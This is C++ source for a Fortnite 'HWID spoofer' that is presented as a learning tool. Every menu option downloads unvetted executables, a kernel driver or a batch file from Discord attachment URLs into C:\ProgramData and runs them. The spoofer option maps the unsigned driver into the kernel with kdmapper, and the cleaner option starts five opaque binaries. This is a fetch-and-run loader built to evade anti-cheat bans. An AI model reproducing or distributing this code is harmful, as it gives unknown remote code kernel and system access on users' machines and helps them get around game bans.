//This is a Simple Hwid Spoofer, i hope u to see selling this :) XD LMAO
//This should be something that u can learn from, Thanks for stopping by
//Maybe Soon ImGui version
//Bye! :) :D

#include <iostream>
#include <Windows.h>
#include "Spoofer.h"
using namespace std;
int choice;
void spoofer() // spoofer
{
	//NewWoof.sys
	{
		string spoofe = "https://cdn.discordapp.com/attachments/826765485450068008/838270400995655711/NewWoof.sys";
		string spoofepath = "C:\\ProgramData\\woof.sys"; //change to dir you want
		URLDownloadToFileA(NULL, spoofe.c_str(), spoofepath.c_str(), 0, NULL);
	}
	//kdmapper1803-20h2.exe
	{
		string mapper = "https://cdn.discordapp.com/attachments/826765485450068008/826768592757587968/kdmapper.exe";
		string mapperpath = "C:\\ProgramData\\mapper.exe";//change to dir you want
		URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
	}
	//more.exe
	{
		string more = "https://cdn.discordapp.com/attachments/826765485450068008/826768724232241152/more.exe";
		string morepath = "C:\\ProgramData\\more.exe";//change to dir you want
		URLDownloadToFileA(NULL, more.c_str(), morepath.c_str(), 0, NULL);
	}


	system("C:\\ProgramData\\mapper.exe C:\\ProgramData\\woof.sys");
	Sleep(2000);
	system("cls");
	system("Start C:\\ProgramData\\more.exe");
	MessageBox(NULL, _T("Wait 60 Seconds For Your Bios And Baseboard To Be Spoofed"), _T("Warning"), MB_OK | MB_SYSTEMMODAL);
	Sleep(60000);
}
void clean()//fn clean
{
	string clean = "https://cdn.discordapp.com/attachments/826765485450068008/826767624225423360/Ntuser.exe";
	string cleann = "C:\\ProgramData\\Ntuser.exe";
	URLDownloadToFile(NULL, clean.c_str(), cleann.c_str(), 0, NULL);
	string app = "https://cdn.discordapp.com/attachments/826765485450068008/826770504849162290/cleaner_protected.exe";
	string app1 = "C:\\ProgramData\\tracer.exe";
	URLDownloadToFile(NULL, app.c_str(), app1.c_str(), 0, NULL);
	string appp = "https://cdn.discordapp.com/attachments/826765485450068008/826770463673417728/cleaner.exe";
	string appp1 = "C:\\ProgramData\\tracerr.exe";
	URLDownloadToFile(NULL, appp.c_str(), appp1.c_str(), 0, NULL);
	string apppp = "https://cdn.discordapp.com/attachments/798311924886142987/824396045416136774/applecleaner.exe";
	string apppp1 = "C:\\ProgramData\\tracerrr.exe";
	URLDownloadToFile(NULL, apppp.c_str(), apppp1.c_str(), 0, NULL);
	string appppp = "https://cdn.discordapp.com/attachments/826765485450068008/826770520334008350/newapplecleaner_1.exe";
	string appppp1 = "C:\\ProgramData\\tracerrrr.exe";
	URLDownloadToFile(NULL, appppp.c_str(), appppp1.c_str(), 0, NULL);
	system("Start C:\\ProgramData\\Ntuser.exe");
	system("Start C:\\ProgramData\\tracer.exe");
	system("Start C:\\ProgramData\\tracerr.exe");
	system("Start C:\\ProgramData\\tracerrr.exe");
	system("Start C:\\ProgramData\\tracerrrr.exe");
}

void checker()//serial checker
{
	string checker = "https://cdn.discordapp.com/attachments/826765485450068008/826767707147337768/Serials.bat";
	string checkerpath = "C:\\ProgramData\\Serials.bat"; //change to dir you want
	URLDownloadToFileA(NULL, checker.c_str(), checkerpath.c_str(), 0, NULL);
	system("Start C:\\ProgramData\\Serials.bat");
}

void title()
{
	std::string raw_str = R"(


   _____ _                 _        _    _          _     _    _____                    __          
  / ____(_)               | |      | |  | |        (_)   | |  / ____|                  / _|         
 | (___  _ _ __ ___  _ __ | | ___  | |__| |_      ___  __| | | (___  _ __   ___   ___ | |_ ___ _ __ 
  \___ \| | '_ ` _ \| '_ \| |/ _ \ |  __  \ \ /\ / / |/ _` |  \___ \| '_ \ / _ \ / _ \|  _/ _ \ '__|
  ____) | | | | | | | |_) | |  __/ | |  | |\ V  V /| | (_| |  ____) | |_) | (_) | (_) | ||  __/ |   
 |_____/|_|_| |_| |_| .__/|_|\___| |_|  |_| \_/\_/ |_|\__,_| |_____/| .__/ \___/ \___/|_| \___|_|   
                    | |                                             | |                             
                    |_|                                             |_|                                                                                             

1: Spoof For Fortnite
2: Cleaner For Fortnite
3: Check Serial Numbers
)";
	std::cout << raw_str;
}
int main()
{
	Something();
	SetRandomTitle();
menu:
	title();
	cin >> choice;
    if (choice == 1)
    {
		spoofer();
		system("CLS");
		goto menu;
    }
    if (choice == 2)
    {
		clean();
		system("CLS");
		goto menu;
    }
	if (choice == 3)
	{
		checker();
		system("CLS");
		goto menu;
	}

}
